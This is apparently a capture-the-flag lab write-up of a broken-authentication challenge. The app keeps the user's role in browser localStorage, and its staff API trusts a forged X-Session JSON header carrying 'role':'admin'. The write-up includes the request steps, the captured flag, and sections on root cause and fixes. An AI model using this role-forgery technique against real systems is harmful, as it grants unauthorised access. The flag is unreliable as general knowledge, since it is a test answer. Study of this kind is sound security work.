# Members Area Pwnbox Lab - Client-Side Role Trust Broken Authentication

Date: 2026-07-08
Target type: CTF/lab
Bug class: Broken authentication, client-side authorization state, forged session role, trust-boundary failure

## Observation

Login app at `https://5e4d65182690.pwnbox-lab.com/`.

Initial page hints:

- "Demo credentials: `guest` / `guest`"
- Challenge text says the user's role is stored in the browser and the server reads it back when visiting the staff area.
- Claim: login only hands out the guest role, so users cannot promote themselves.

Frontend behavior on login page:

```javascript
const res = await fetch('/api/login', {
  method: 'POST',
  headers: { 'content-type': 'application/json' },
  body: JSON.stringify({
    username: fd.get('username'),
    password: fd.get('password'),
  }),
});

localStorage.setItem('session', JSON.stringify(data));
window.location = '/dashboard';
```

Successful guest login returned:

```json
{"login_time":1783532067,"role":"guest","user":"guest"}
```

Dashboard and staff area both read from browser storage instead of using an HttpOnly server session.

## Hypothesis

If the server trusts the browser-stored session object, then modifying the JSON before requesting the staff API should let the client promote itself. The key question is which role string the staff endpoint accepts.

## Evidence

### Staff page trust boundary

The staff page sends the browser-stored string directly to the server:

```javascript
const session = localStorage.getItem('session') || '';
const res = await fetch('/api/staff', {
  headers: { 'X-Session': session },
});
```

### Control request

Guest session:

```json
{"user":"guest","role":"guest"}
```

Response:

```text
403 {"error":"staff only"}
```

### Forged role tests

Forged staff session:

```json
{"user":"guest","role":"staff"}
```

Response:

```text
403 {"error":"staff only"}
```

Forged admin session:

```json
{"user":"guest","role":"admin"}
```

Response:

```json
{"flag":"pwnbox{b3d57f1e3a2c8b0d4e6f7a8b9c0d1e2f}","ok":true}
```

This proved the accepted privileged value is `admin`, not `staff`.

## Test

1. Log in with `guest/guest` and inspect the returned JSON.
2. Observe that the app stores that JSON in `localStorage.session`.
3. Observe that `/staff` sends the same string in `X-Session`.
4. Replace `"role":"guest"` with `"role":"admin"`.
5. Request `/api/staff` with the forged header.

## Result

Confirmed chain:

```text
Guest login returns client-stored session JSON
-> browser stores role in localStorage
-> staff page forwards that JSON in X-Session
-> server trusts client-supplied role
-> forged role=admin grants protected access
-> flag returned by /api/staff
```

Flag:

```text
pwnbox{b3d57f1e3a2c8b0d4e6f7a8b9c0d1e2f}
```

## Why Failed Assumptions Failed

1. **Guest role cannot self-promote** — false; client can edit localStorage or forge `X-Session` directly.
2. **Staff area requires a server-issued privilege** — false; no signed server-side token was required.
3. **Role `staff` is the target** — false; the API actually required `admin`.

## Why Working Test Worked

The server accepted an unsigned, client-controlled JSON blob as the source of truth for authorization. Changing only the `role` field changed the server-side authorization decision.

## Root Cause

1. Authorization state was stored client-side without integrity protection.
2. Server trusted the `X-Session` header as if it were a valid session.
3. Role enforcement depended on mutable browser data rather than server-side session state.

## Impact

- Self-promotion from guest to admin.
- Full bypass of server-side role assignment logic.
- In a real app, access to staff/admin endpoints, data exports, or destructive actions.

## Fix

- Keep roles and session state server-side.
- If tokens are used, sign them and verify integrity before trusting claims.
- Never accept raw client-provided role fields as the authorization source of truth.
- Prefer HttpOnly, Secure session cookies or verified signed tokens.

## Regression Test

- Modifying client-side session JSON must not change privileges.
- Unsigned `X-Session` headers must be ignored or rejected.
- A guest login must remain guest even if the browser changes local state.

## Report Summary

Members Area stored the authenticated role in `localStorage` and sent it back to the server in an `X-Session` header when requesting `/api/staff`. The server trusted that client-controlled JSON without integrity checks. Changing the role from `guest` to `admin` granted access to the protected endpoint and returned the flag.
